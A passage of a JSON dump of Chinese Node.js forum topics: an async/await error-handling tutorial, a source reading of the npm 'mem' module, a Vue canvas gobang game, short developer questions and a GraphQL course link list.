setTimeout(function () { \n      if (Math.random() &gt; 0.5) { \n        reject(new Error(&#x27;Navigation system check failed&#x27;)); \n      } else { \n        console.log(&#x27;Navigation system check completed&#x27;); \n        resolve(); \n      } \n    }, 450) \n  }); \n} \n</code></pre><p>创建一个async的main函数调用每个在上一步中创建的功能函数。等待结果，捕获并记录引发的异常。如果没有抛出异常，则记录成功：</p>\n<pre class=\"prettyprint language-js\"><code> export async function main() { \n try { \n const prelaunchChecks = [ \n  checkEngines, \n  checkFlightPlan, \n  checkNavigationSystem \n ]; \n await Promise.all(prelauchCheck.map((check) =&gt; check()); \n console.log(&#x27;All systems go, ready to launch: 🚀&#x27;); \n } catch (e) { \n console.error(&#x27;Aborting launch: &#x27;); \n console.error(e); \n } \n } \n} \n</code></pre><ul>\n<li>在工作区域运行 http-server 命令，你将会看到如下输出</li>\n</ul>\n<p><img src=\"https://ask.qcloudimg.com/draft/1036137/xyi0v8fsql.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>Promise.all返回一个Promise，当await在错误状态下，会抛出异常。三个异步promise同时执行，如果其中一个或多个错误得到满足，则会抛出一个或多个错误；</p>\n<p>你会发现只有一个错误会被记录下来，与同步代码一样，我们的代码可能会抛出多个异常，但只有一个异常会被catch捕获并记录。</p>\n<h2>使用finally确保函数执行</h2>\n<p>错误处理可能会变得相当复杂。有些情况，其中你希望发生错误时继续冒泡调用堆栈以便执行其它更高级别处理。在这些情况下，您可能还需要执行一些清理任务。本小节，你将了解如何使用finally以确保执行某些代码，而不管错误状态如何,具体如何实现示例如下：</p>\n<ul>\n<li>通过控制台命令切换至工作区</li>\n<li>创建一个Promise-all-collect-concurrently的文件夹</li>\n<li>创建三个async函数checkEngines，checkFlightPlan、checkNavigationSystem用来记录信息，返回Promise，一个成功的值的信息和一个失败值的信息：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>function checkEngines() { \n console.log(&#x27;checking engine&#x27;); \n return new Promise(function (resolve, reject) { \n setTimeout(function () { \n  if (Math.random() &gt; 0.5) { \n  reject(new Error(&#x27;Engine check failed&#x27;)); \n  } else { \n  console.log(&#x27;Engine check completed&#x27;); \n  resolve(); \n  } \n }, 250) \n }); \n} \nfunction checkFlightPlan() { \n console.log(&#x27;checking flight plan&#x27;); \n return new Promise(function (resolve, reject) { \n setTimeout(function () { \n  if (Math.random() &gt; 0.5) { \n  reject(new Error(&#x27;Flight plan check failed&#x27;)); \n  } else { \n  console.log(&#x27;Flight plan check completed&#x27;); \n  resolve(); \n  } \n }, 350) \n }); \n} \nfunction checkNavigationSystem() { \n console.log(&#x27;checking navigation system&#x27;); \n return new Promise(function (resolve, reject) { \n setTimeout(function () { \n  if (Math.random() &gt; 0.5) { \n  reject(new Error(&#x27;Navigation system check failed&#x27;)); \n  } else { \n  console.log(&#x27;Navigation system check completed&#x27;); \n  resolve(); \n  } \n }, 450) \n }); \n} \n</code></pre><ul>\n<li>创建一个asyncperformCheck函数，调用上一步中创建的每个函数。等待结果，并用于finally记录完整的消息：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>async function performChecks() { \n console.log(&#x27;Starting Pre-Launch Checks&#x27;); \n try { \n const prelaunchChecks = [ \n  checkEngines, \n  checkFlightPlan, \n  checkNavigationSystem \n ]; \n return Promise.all(prelauchCheck.map((check) =&gt; check()); \n } finally { \n console.log(&#x27;Completed Pre-Launch Checks&#x27;); \n } \n } \n</code></pre><ul>\n<li>创建一个async的main函数调该函数performChecks。等待结果，捕获并记录引发的异常。</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>export async function main() { \n try { \n await performChecks(); \n console.log(&#x27;All systems go, ready to launch: 🚀&#x27;); \n } catch (e) { \n console.error(&#x27;Aborting launch: &#x27;); \n console.error(e); \n } \n} \n</code></pre><ul>\n<li>在工作区域运行 http-server 命令，你将会看到如下输出</li>\n</ul>\n<p><img src=\"https://ask.qcloudimg.com/draft/1036137/x5qe0588gm.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>与上一小节一样，异常在main函数中进行捕获，由于finally的存在，让我清楚的知道performChecks确保需要执行的输出完成。你可以设想，处理错误是一个重要的任务，并且<strong>async/await</strong>允许我们使用<strong>try/catch</strong>的方式同时处理异步和同步代码的错误，大大简化了我们处理错误的工作量，让代码更加简洁。</p>\n<h1>用async/await改写上篇文章Promise的例子</h1>\n<p>上篇文章《JavaScript基础——Promise使用指南》的最后，我们使用Promise的方法改写了回调的例子，本文的最后，我们将用今天学到的内容<strong>async/await</strong>改写这个例子，如何实现呢，代码如下：</p>\n<pre class=\"prettyprint language-js\"><code>const fs = require(&#x27;fs&#x27;); \nconst path = require(&#x27;path&#x27;); \nconst postsUrl = path.join(__dirname, &#x27;db&#x2F;posts.json&#x27;); \nconst commentsUrl = path.join(__dirname, &#x27;db&#x2F;comments.json&#x27;); \n&#x2F;&#x2F;return the data from our file \nfunction loadCollection(url) { \n return new Promise(function(resolve, reject) { \n  fs.readFile(url, &#x27;utf8&#x27;, function(error, data) { \n   if (error) { \n    reject(&#x27;error&#x27;); \n   } else { \n    resolve(JSON.parse(data)); \n   } \n  }); \n }); \n} \n&#x2F;&#x2F;return an object by id \nfunction getRecord(collection, id) { \n return new Promise(function(resolve, reject) { \n  const data = collection.find(function(element){ \n   return element.id == id; \n  }); \n  resolve(data); \n }); \n} \n&#x2F;&#x2F;return an array of comments for a post \nfunction getCommentsByPost(comments, postId) { \n return comments.filter(function(comment){ \n  return comment.postId == postId; \n }); \n} \nasync function getPost(){ \n try { \n  const posts = await loadCollection(postsUrl); \n  const post = await getRecord(posts, &quot;001&quot;); \n  const comments = await loadCollection(commentsUrl); \n  const postComments = await getCommentsByPost(comments, post.id); \n  console.log(post); \n  console.log(postComments); \n } catch (error) { \n  console.log(error); \n } \n} \ngetPost(); \n</code></pre><p>和Promise的方式相比，<strong>async/await</strong> 的实现方式是不是更直观更容易理解呢，让我几乎能用同步的方式编写异步代码。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"JavaScript基础——深入学习async/await","last_reply_at":"2018-12-20T10:27:46.744Z","good":false,"top":false,"reply_count":0,"visit_count":676,"create_at":"2018-12-20T10:27:46.744Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5b82dd11632c7f422e5b815a","author_id":"5b804123a210553a0cde2bfc","tab":"share","content":"<div class=\"markdown-text\"><h1>每天阅读一个 npm 模块（2）- mem</h1>\n<p>系列文章：</p>\n<ol>\n<li><a href=\"https://cnodejs.org/topic/5b8041eec52ad1482eb941ce\">每天阅读一个 npm 模块（1）- username</a></li>\n</ol>\n<p>昨天阅读 <a href=\"https://www.npmjs.com/package/username\">username</a> 3.0.0 版本的源码之后，根据自己的想法向作者 Sindre Sorhus 提出了 <a href=\"https://github.com/sindresorhus/username/pull/20\">Pull Request</a>，没想到今天 Sindre 接受了 PR 同时放弃了对 Node 4 的支持，升级至 4.0.0 版本，不过核心代码并有太大的变化 😊</p>\n<h2>一句话介绍</h2>\n<p>今天阅读的 npm 模块是 <a href=\"https://www.npmjs.com/package/mem\">mem</a>，它通过缓存函数的返回值从而减少函数的实际执行次数，进而提升性能，当前版本为 3.0.1，周下载量约为 350 万。</p>\n<h2>用法</h2>\n<pre class=\"prettyprint language-javascript\"><code>const mem = require(&#x27;mem&#x27;);\n \n&#x2F;&#x2F; 同步函数缓存\nlet i = 0;\nconst counter = () =&gt; ++i;\nconst memoized = mem(counter);\n \nmemoized(&#x27;foo&#x27;);\n&#x2F;&#x2F;=&gt; 1\n \nmemoized(&#x27;foo&#x27;);\n&#x2F;&#x2F;=&gt; 1   参数相同，返回换成的结果 1\n \nmemoized(&#x27;bar&#x27;);\n&#x2F;&#x2F;=&gt; 2   参数变化，counter 函数再次执行，返回 2\n \nmemoized(&#x27;bar&#x27;);\n&#x2F;&#x2F;=&gt; 2\n\n&#x2F;&#x2F; 异步函数缓存\nlet j = 0;\nconst asyncCounter = () =&gt; Promise.resolve(++j);\nconst asyncmemoized = mem(asyncCounter);\n\nasyncmemoized().then(a =&gt; {\n    console.log(a);\n    &#x2F;&#x2F;=&gt; 1\n \n    asyncmemoized().then(b =&gt; {\n        console.log(b);\n        &#x2F;&#x2F;=&gt; 1\n    });\n});\n</code></pre><p>上述用法是 <a href=\"https://www.npmjs.com/package/mem\">mem</a> 的核心功能，除此之外它还支持 设置缓存时间、自定义缓存 Hash 值、统计缓存命中数据等功能。</p>\n<h2>源码学习</h2>\n<h3>哈希函数</h3>\n<p>为了让被 <code>mem</code> 处理过的函数对于相同的参数能返回同样的值，那么就必须对参数进行哈希处理，然后将哈希结果作为 <code>key</code>，函数运行结果作为 <code>value</code> 缓存起来，举一个最简单的例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>const cache = {};\n\n&#x2F;&#x2F; 缓存 arg1 的运行结果\nconst key1 = getHash(arg1);\ncache[key1] = func(arg1);\n\n&#x2F;&#x2F; 缓存 arg2 的运行结果\nconst key2 = getHash(arg2);\ncache[key2] = func(arg2);\n</code></pre><p>其中的关键在于 <code>getHash</code> 这个哈希函数：如何处理不同的数据类型？如何处理对象间的比较？其实这也是面试中经常被问到的问题：如何进行深比较？来看看源代码中是怎么写的：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 源代码 2-1: mem 的哈希函数\nconst defaultCacheKey = (...args) =&gt; {\n\tif (args.length === 1) {\n\t\tconst [firstArgument] = args;\n\t\tif (\n\t\t\tfirstArgument === null ||\n\t\t\tfirstArgument === undefined ||\n\t\t\t(typeof firstArgument !== &#x27;function&#x27; &amp;&amp; typeof firstArgument !== &#x27;object&#x27;)\n\t\t) {\n\t\t\treturn firstArgument;\n\t\t}\n\t}\n\n\treturn JSON.stringify(args);\n};\n</code></pre><p>从上面的代码中可以看到：</p>\n<ol>\n<li>当只有一个参数，且参数为 null | undefined 或者类型不为 function | object 时，哈希函数直接将参数返回。</li>\n<li>若不是上述情况，则返回参数经过 <code>JSON.stringify()</code> 的值。</li>\n</ol>\n<p>首先可以复习一下 ES6 中定义了其中数据类型，包括 6 种原始类型（Boolean | Nunber | Null | Undefined | String| Symbol）和 Object 类型。源代码中的哈希函数需要对不同的类型加以区分是因为 Object 类型的直接比较结果和我们这里需要达成的效果不符合：</p>\n<pre class=\"prettyprint language-javascript\"><code>const object1 = {a: 1};\nconst object2 = {a: 1};\n\nconsole.log(object1 === object2);\n&#x2F;&#x2F; =&gt; flase\n\n&#x2F;&#x2F; 期望效果\nconsole.log(defaultCacheKey(object1) === defaultCacheKey(object2));\n&#x2F;&#x2F; =&gt; true\n</code></pre><p>一开始我以为作者会通过判断不同的数据类型后再进行专门的处理（类似于 <a href=\"https://github.com/lodash/lodash/blob/4.17.10/lodash.js#L11530\">Lodash 的 _.isEqual() 实现</a>），没想到采用的方法这么暴力：直接将 Object 类型的数据通过 <code>JSON.stringify()</code> 转化为字符串后进行处理！刚看到的我是惊呆了的 —— 以前只听有人开玩笑这么干，没想到真会这么做。</p>\n<p>这种方法十分简单，而且可读性很高，但是会存在问题：</p>\n<ol>\n<li>\n<p>当对象结构复杂时，<code>JSON.stringify()</code> 会消耗不少时间。</p>\n</li>\n<li>\n<p>对于不同的正则对象，<code>JSON.stringify()</code> 的结果均为 <code>{}</code>，与哈希函数的预期效果不符。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(JSON.stringify(&#x2F;Sindre Sorhus&#x2F;));\n&#x2F;&#x2F; =&gt; &#x27;{}&#x27;\n\nconsole.log(JSON.stringify(&#x2F;Elvin Peng&#x2F;));\n&#x2F;&#x2F; =&gt; &#x27;{}&#x27;\n</code></pre></li>\n</ol>\n<p>第一个问题还好，因为假如通过 <code>JSON.stringify()</code> 哈希时，性能存在问题的话，<code>mem</code> 支持传入自定义的哈希函数，可以通过自行编写高效哈希函数进行解决。</p>\n<p>第二个问题属于函数功能不符合预期，需要进行 bugfix。</p>\n<h3>存储结构</h3>\n<p>不考虑额外参数时，对于同步函数的支持源代码可简化如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 源代码 2-2 mem 核心逻辑\nconst mimicFn = require(&#x27;mimic-fn&#x27;);\n\nconst cacheStore = new WeakMap();\n\nmodule.exports = (fn) =&gt; {\n    const memoized = function (...args) {\n        const cache = cacheStore.get(memoized);\n        const key = defaultCacheKey(...args);\n        \n        if (cache.has(key)) {\n            const c = cache.get(key);\n            return c.data;\n        }\n\n        const ret = fn.call(this, ...args);\n        \n        const setData = (key, data) =&gt; {\n            cache.set(key, {\n                data,\n            });\n        };\n        \n        setData(key, ret);\n        \n        return ret;\n    }\n    \n    const retCache = new Map();\n   \n    mimicFn(memoized, fn);\n\n    cacheStore.set(memoized, retCache);\n\n    return memoized;\n}\n\n\n\n</code></pre><p>整体逻辑十分清晰，主要是完成两个动作：</p>\n<ol>\n<li>将类型为 <code>Map</code> 的 <code>retCache</code> 作为函数执行结果的缓存，缓存的键值为 <code>defaultCacheKey</code> 哈希后的结果。</li>\n<li>将类型为 <code>WeakMap</code> 的 <code>cacheStore</code> 作为整体的缓存，缓存的键值为函数本身。</li>\n</ol>\n<p>通过上面两个动作形成的二级缓存实现了模块的核心功能，这里两个类型的选择非常值得探究。</p>\n<p><code>retCache</code> 选用 <code>Map</code> 类型而不用 <code>Object</code> 类型主要是因为 <code>Map</code> 的键值支持所有类型，而 <code>Object</code> 的键值只支持字符串，除此之外，关于缓存数据结构优选选择 <code>Map</code> 类型还有以下优点：</p>\n<ul>\n<li><code>Map.size</code> 属性可以方便的获得当前缓存的个数</li>\n<li><code>Map</code> 类型支持 <code>clear()</code> | <code>forEach()</code> 等常用的工具函数</li>\n<li><code>Map</code> 类型是默认可迭代的，即支持 <code>iterable protocol</code></li>\n</ul>\n<p><code>cacheStore</code> 选用 <code>WeakMap</code> 类型而不用 <code>Map</code> 类型主要是因为其具有不增加引用个数的优点，更有利于 Node.js 引擎的垃圾回收。</p>\n<h3>异步支持</h3>\n<p>本来还打算写一写关于异步支持的部分，不过现在已经是凌晨一点，想想还是算了吧，早点睡觉 😪</p>\n<p>感兴趣的朋友可以自己阅读～</p>\n<h2>写在最后</h2>\n<p>除了上文提到的一个 Bug 之外，<code>mem</code> 还存在内存泄漏的可能性：当缓存的数据已过期后（即被缓存的时间大于设置的 maxAge）并不会被自动清除，这可能造成当缓存的数据过多之后其无效缓存占据的内存无法被及时释放，从而导致内存泄漏，具体的讨论可以见<a href=\"https://github.com/sindresorhus/mem/issues/14\">Issue #14: Memory leak: old results are not deleted from the cache</a>。</p>\n<p>在源代码 2-2 的解读中故意略去了 <code>mimicFn(memoized, fn);</code> 的作用，为什么呢？因为明天准备阅读 <a href=\"https://www.npmjs.com/package/mimic-fn\">mimicFn</a> 这个模块，希望大家能继续捧场。</p>\n<blockquote>\n<p>关于我：毕业于华科，工作在腾讯，<a href=\"https://segmentfault.me/\">elvin 的博客</a> 欢迎来访 ^_^</p>\n</blockquote>\n</div>","title":"每天阅读一个 npm 模块（2）- mem","last_reply_at":"2018-12-20T10:12:02.860Z","good":false,"top":false,"reply_count":13,"visit_count":1893,"create_at":"2018-08-26T17:02:09.518Z","author":{"loginname":"elvinn","avatar_url":"https://avatars0.githubusercontent.com/u/28722527?v=4&s=120"}},{"id":"5c1b3fe93898674067a7661c","author_id":"5b3c74eb57137f22415c53e0","tab":"ask","content":"<div class=\"markdown-text\"><p>开发egg可以用webstorm直接设置断点调试，但是研究rollup、webpack，自己写plugin，也是走不了断点，只有用console输出控制台看结果。。感觉很不方便研究。基本上就是通过npm运行的，目前我只发现egg可以进断点！！</p>\n</div>","title":"如何调试npm上面的模块","last_reply_at":"2018-12-20T09:01:19.675Z","good":false,"top":false,"reply_count":2,"visit_count":622,"create_at":"2018-12-20T07:08:25.063Z","author":{"loginname":"liuboo456","avatar_url":"https://avatars2.githubusercontent.com/u/26320477?v=4&s=120"}},{"id":"5c189bd17ec239239ff57fb4","author_id":"5c189ae2f3d48d2397c126f9","tab":"ask","content":"<div class=\"markdown-text\"><p>今天开始搞modejs后端，公司现在是用egg，感觉比较容易，结构清晰，开发便捷，大家公司用这个框架的多吗？用koa的多不多？</p>\n</div>","title":"弱弱问问各位大佬，大家都在用egg还是koa?","last_reply_at":"2018-12-20T07:59:29.199Z","good":false,"top":false,"reply_count":9,"visit_count":1303,"create_at":"2018-12-18T07:03:45.449Z","author":{"loginname":"meikoooo","avatar_url":"https://avatars0.githubusercontent.com/u/45453683?v=4&s=120"}},{"id":"5c11dc88f3d48d2397c10b70","author_id":"5a3075929807389a1809f330","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<ul>\n<li><a href=\"https://unnue.com/game/gobang\">预览效果</a></li>\n<li><a href=\"https://github.com/jigsaw-china/unnue-nuxt/blob/master/pages/game/gobang.vue\">github源码</a></li>\n</ul>\n</blockquote>\n<ul>\n<li>核心代码</li>\n</ul>\n<pre class=\"prettyprint language- javascript\"><code>export default {\n  data () {\n    return {\n      chess: {},\n      context: {},\n      chessBoard: [], &#x2F;&#x2F; 记录是否走过\n      me: true,\n      count: 0, &#x2F;&#x2F; 所有赢法数量\n      wins: [], &#x2F;&#x2F; 赢法数组\n      myWin: [], &#x2F;&#x2F; 我方赢法的统计数组\n      computerWin: [], &#x2F;&#x2F; 计算机赢法的统计数组\n      over: false,\n    }\n  },\n  mounted () {\n    setTimeout(_ =&gt; {\n      this.init()\n    })\n  },\n  methods: {\n    &#x2F;&#x2F; 初始化\n    init () {\n      this.chess = this.$refs.canvas\n      this.context = this.chess.getContext(&quot;2d&quot;)\n      this.drawImage( _ =&gt; {\n        this.drawChessBoard()\n      })\n      this.fillArray()\n    },\n    &#x2F;&#x2F; 填充数组\n    fillArray () {\n      &#x2F;&#x2F; 是否走过\n      for (let i = 0; i &lt; 15; i++) {\n        this.chessBoard[i] = []\n        for (let j = 0; j &lt; 15; j++) {\n          this.chessBoard[i][j] = 0\n        }\n      }\n      &#x2F;&#x2F; 赢法数组\n      for (let i = 0; i &lt; 15; i++) {\n        this.wins[i] = []\n        for (let j = 0; j &lt; 15; j++) {\n          this.wins[i][j] = []\n        }\n      }\n      &#x2F;&#x2F; 横\n      for (let i = 0; i &lt; 15; i++) {\n        for (let j = 0; j &lt; 11; j++) {\n          for (let k = 0; k &lt; 5; k++) {\n            this.wins[i][j+k][this.count] = true\n          }\n          this.count++\n        }\n      }\n      &#x2F;&#x2F; 竖\n      for (let i = 0; i &lt; 15; i++) {\n        for (let j = 0; j &lt; 11; j++) {\n          for (let k = 0; k &lt; 5; k++) {\n            this.wins[j+k][i][this.count] = true\n          }\n          this.count++\n        }\n      }\n      &#x2F;&#x2F; 斜\n      for (let i = 0; i &lt; 11; i++) {\n        for (let j = 0; j &lt; 11; j++) {\n          for (let k = 0; k &lt; 5; k++) {\n            this.wins[i+k][j+k][this.count] = true\n          }\n          this.count++\n        }\n      }\n      &#x2F;&#x2F; 反斜\n      for (let i = 0; i &lt; 11; i++) {\n        for (let j = 14; j &gt; 3; j--) {\n          for (let k = 0; k &lt; 5; k++) {\n            this.wins[i+k][j-k][this.count] = true\n          }\n          this.count++\n        }\n      }\n      &#x2F;&#x2F; 赢法的统计数组\n      for (let i = 0; i &lt; this.count; i++) {\n        this.myWin[i] = 0\n        this.computerWin[i] = 0\n      }\n    },\n    &#x2F;&#x2F; 绘制水印\n    drawImage (callback) {\n      const { context } = this\n      const img = new Image()\n      img.src = &quot;&#x2F;images&#x2F;logo.svg&quot;\n      img.onload = _ =&gt; {\n        context.drawImage(img, (450 - img.width)&#x2F;2, (450 - img.height)&#x2F;2, img.width, img.height)\n        callback()\n      }\n    },\n    &#x2F;&#x2F; 绘制棋盘\n    drawChessBoard () {\n      const { context } = this\n      context.strokeStyle = &#x27;#bfbfbf&#x27;\n      for (let i = 0; i &lt; 15; i++) {\n        context.moveTo(15 + i * 30, 15)\n        context.lineTo(15 + i * 30, 435)\n        context.stroke()\n        context.moveTo(15, 15 + i * 30)\n        context.lineTo(435, 15 + i * 30)\n        context.stroke()\n      }\n    },\n    &#x2F;&#x2F; 落子实现\n    onStep (x, y, me) {\n      const { context } = this\n      context.beginPath()\n      context.arc(15 + x * 30, 15 + y * 30, 13, 0, 2 * Math.PI)\n      context.closePath()\n      const gradient = context.createRadialGradient(15 + x * 30 + 2, 15 + y * 30 - 2, 13, 15 + x * 30 + 2, 15 + y * 30 - 2, 0)\n      if (me) {\n        gradient.addColorStop(0, &#x27;#0a0a0a&#x27;)\n        gradient.addColorStop(1, &#x27;#636766&#x27;)\n      } else {\n        gradient.addColorStop(0, &#x27;#d1d1d1&#x27;)\n        gradient.addColorStop(1, &#x27;#f9f9f9&#x27;)\n      }\n      context.fillStyle = gradient\n      context.fill()\n    },\n    &#x2F;&#x2F; 我方落子\n    chessClick (e) {\n      if (this.over) {\n        return\n      }\n      if (!this.me) {\n        return\n      }\n      const ox = e.offsetX\n      const oy = e.offsetY\n      const x = Math.floor(ox&#x2F;30)\n      const y = Math.floor(oy&#x2F;30)\n\n      if (this.chessBoard[x][y] === 0) {\n        this.chessBoard[x][y] = 1\n        this.onStep(x, y, this.me)\n\n        &#x2F;&#x2F; 统计赢法\n        for (let k = 0; k &lt; this.count; k++) {\n          if (this.wins[x][y][k]) {\n            this.myWin[k]++\n            this.computerWin[k] = 6\n            if (this.myWin[k] === 5) {\n              alert(&#x27;你赢了&#x27;)\n              this.over = true\n            }\n          }\n        }\n        if (!this.over) {\n          this.me = !this.me\n          this.computerAI()\n        }\n      }\n    },\n    &#x2F;&#x2F; 计算机落子\n    computerAI () {\n      const myScore = []\n      const computerScore = []\n      let max = 0 &#x2F;&#x2F; 最大分数\n      let u = 0, v = 0 &#x2F;&#x2F; 所在坐标\n\n      for (let i = 0; i &lt; 15; i++) {\n        myScore[i] = []\n        computerScore[i] = []\n        for (let j = 0; j &lt; 15; j++) {\n          myScore[i][j] = 0\n          computerScore[i][j] = 0\n        }\n      }\n      &#x2F;&#x2F; 遍历棋盘\n      for (let i = 0; i &lt; 15; i++) {\n        for (let j = 0; j &lt; 15; j++) {\n          if (this.chessBoard[i][j] === 0) {\n            &#x2F;&#x2F; 遍历所有赢法\n            for (let k = 0; k &lt; this.count; k++) {\n              if (this.wins[i][j][k]) {\n                &#x2F;&#x2F; 我方\n                if (this.myWin[k] === 1) {\n                  myScore[i][j] += 200\n                } else if (this.myWin[k] === 2) {\n                  myScore[i][j] += 400\n                } else if (this.myWin[k] === 3) {\n                  myScore[i][j] += 2000\n                } else if (this.myWin[k] === 4) {\n                  myScore[i][j] += 10000\n                }\n                &#x2F;&#x2F; 计算机\n                if (this.computerWin[k] === 1) {\n                  computerScore[i][j] += 220\n                } else if (this.computerWin[k] === 2) {\n                  computerScore[i][j] += 420\n                } else if (this.computerWin[k] === 3) {\n                  computerScore[i][j] += 2100\n                } else if (this.computerWin[k] === 4) {\n                  computerScore[i][j] += 20000\n                }\n              }\n            }\n            &#x2F;&#x2F; 比较分数\n            if (myScore[i][j] &gt; max) {\n              max = myScore[i][j]\n              u = i\n              v = j\n            } else if (myScore[i][j] === max) {\n              if (computerScore[i][j] &gt; computerScore[u][v]) {\n                u = i\n                v = j\n              }\n            }\n            if (computerScore[i][j] &gt; max) {\n              max = computerScore[i][j]\n              u = i\n              v = j\n            } else if (computerScore[i][j] === max) {\n              if (myScore[i][j] &gt; myScore[u][v]) {\n                u = i\n                v = j\n              }\n            }\n          }\n        }\n      }\n      this.onStep(u, v, false)\n      this.chessBoard[u][v] = 2\n      &#x2F;&#x2F; 统计赢法\n      for (let k = 0; k &lt; this.count; k++) {\n        if (this.wins[u][v][k]) {\n          this.computerWin[k]++\n          this.myWin[k] = 6\n          if (this.computerWin[k] === 5) {\n            alert(&#x27;计算机赢了&#x27;)\n            this.over = true\n          }\n        }\n      }\n      if (!this.over) {\n        this.me = !this.me\n      }\n    }\n  }\n}\n</code></pre><p>原文地址：<a href=\"https://unnue.com/article/50\">https://unnue.com/article/50</a></p>\n</div>","title":"Vue 实现人机五子棋，Canvas绘图，不难理解直接上码","last_reply_at":"2018-12-20T06:53:49.090Z","good":false,"top":false,"reply_count":2,"visit_count":1040,"create_at":"2018-12-13T04:14:00.109Z","author":{"loginname":"varscc","avatar_url":"https://avatars3.githubusercontent.com/u/32264346?v=4&s=120"}},{"id":"5062a80901d0b8014839e5b1","author_id":"4efc278625fa69ac6900058d","content":"<div class=\"markdown-text\"></div>","title":"NodeJS有没有可能发展为一个操作系统？\r\n* 基于Linux内核\r\n* 基于各种硬件驱动\r\n* 基于Web构建类似X协议的UI\r\n......","last_reply_at":"2018-12-20T06:18:05.448Z","good":false,"top":false,"reply_count":9,"visit_count":5263,"create_at":"2012-09-26T07:00:25.734Z","author":{"loginname":"alli","avatar_url":"//gravatar.com/avatar/ae631c1c54b7d365cda4301947d45ceb?s=48"}},{"id":"5c11f6fbf3d48d2397c10bf4","author_id":"58400cd63aa1310a5786878f","tab":"share","content":"<div class=\"markdown-text\"><h2>诱人的 GraphQL 视频教程（34 个视频）</h2>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-1-jie-shao\">诱人的 GraphQL 视频教程 #1 介绍</a>「06:59」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-2-da-jian-express-xiang-mu-kuang-jia\">诱人的 GraphQL 视频教程 #2 搭建 Express 项目框架</a>「05:40」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-3-da-jian-graphql-xiang-mu-kuang-jia\">诱人的 GraphQL 视频教程 #3 搭建  GraphQL 项目框架</a>「04:06」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-4-chuang-jian-di-yi-ge-graphql-schema\">诱人的 GraphQL 视频教程 #4 创建第一个 GraphQL Schema</a>「Pro」「04:26」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-5-root-query\">诱人的 GraphQL 视频教程 #5 Root Query</a>「Pro」「04:24」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-6-resolve-function\">诱人的 GraphQL 视频教程 #6 Resolve Function</a>「Pro」「05:18」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-7-zai-graphiql-zhong-ce-shi-cha-xun\">诱人的 GraphQL 视频教程 #7 在 Graphiql 中测试查询</a>「Pro」「05:46」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-8-ben-di-ce-shi-ruan-jian-graphql-playground-jian-graphqlplayground\">诱人的 GraphQL 视频教程 #8 酷炫的本地测试软件 graphql-playground</a>「Pro」「03:49」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-9-graphqlid\">诱人的 GraphQL 视频教程 #9 GraphQLID</a>「Pro」「03:11」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-10-author-type-he-graphqlint\">诱人的 GraphQL 视频教程 #10 Author Type 和 GraphQLInt</a>「Pro」「05:11」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-11-guan-lian-guan-xi\">诱人的 GraphQL 视频教程 #11 关联关系</a>「Pro」「07:53」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-12-graphqllist\">诱人的 GraphQL 视频教程 #12 GraphQLList</a>「Pro」「05:30」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-13-fan-hui-graphql-lie-biao\">诱人的 GraphQL 视频教程 #13 返回 GraphQL 列表</a>「Pro」「04:27」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-14-lian-jie-dao-mlab-xian-shang-de-mongodb-shu-ju-ku\">诱人的 GraphQL 视频教程 #14 连接到 mLab 线上的 MongoDB 数据库</a>「Pro」「07:04」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-15-mongoose-models\">诱人的 GraphQL 视频教程 #15 Mongoose Models</a>「Pro」「06:36」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-16-mutations\">诱人的 GraphQL 视频教程 #16 Mutations</a>「Pro」「08:27」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-17-geng-duo-de-mutations\">诱人的 GraphQL 视频教程 #17 更多的 Mutations</a>「Pro」「06:04」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-18-geng-xin-resolve\">诱人的 GraphQL 视频教程 #18 更新 Resolve</a>「Pro」「08:36」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-19-graphqlnonnull\">诱人的 GraphQL 视频教程 #19 GraphQLNonNull</a>「Pro」「04:15」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-20-tian-jia-react-qian-duan\">诱人的 GraphQL 视频教程 #20 添加 React 前端</a>「Pro」「08:10」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-21-jian-li-apollo-react-ke-hu-duan\">诱人的 GraphQL 视频教程 #21 建立 Apollo React 客户端</a>「Pro」「08:30」</p>\n<p><a 